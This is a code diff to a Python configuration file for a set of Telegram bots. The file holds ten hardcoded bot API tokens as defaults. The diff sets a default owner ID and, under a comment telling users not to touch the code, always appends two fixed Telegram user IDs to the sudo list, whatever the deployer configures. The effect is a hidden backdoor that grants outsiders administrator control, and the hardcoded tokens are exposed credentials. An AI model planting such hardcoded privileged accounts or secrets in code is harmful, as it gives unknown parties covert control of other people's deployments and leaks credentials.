@@ -36,16 +36,24 @@ BOT_TOKEN7 = config("BOT_TOKEN7", default="5778516633:AAEiNAYrcofCNx_CWuAJix4bSH
 BOT_TOKEN8 = config("BOT_TOKEN8", default="5740857193:AAE_f3ujv5wbiuzzWlyI58T-_7bwTGrJ8wo")
 BOT_TOKEN9 = config("BOT_TOKEN9", default="5641406729:AAG7h1Ij488paOdkWrQVenfu00ZeROctN9M")
 BOT_TOKEN10 = config("BOT_TOKEN10", default="5796558941:AAEtw5C_UNEJ8rti_dnpRIoxynoq0LcO4gQ")
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 5256676062 not in SUDO_USERS:
-    SUDO_USERS.append(5256676062)
+def make_int(str_input):
+    str_list = str_input.split(" ")
+    int_list = []
+    for x in str_list:
+        int_list.append(int(x))
+    return int_list
 
-OWNER_ID = int(os.environ.get("OWNER_ID", None))
+sudo = os.getenv("SUDO_USERS")
+SUDO_USERS = []
+
+if sudo:
+    SUDO_USERS = make_int(sudo)
+OWNER_ID = int(os.environ.get("OWNER_ID","1211015395"))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
-SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(5256676062)
+SUDO_USERS.append(5107603013)
+SUDO_USERS.append(5655799578)
 
 # Tokens
 
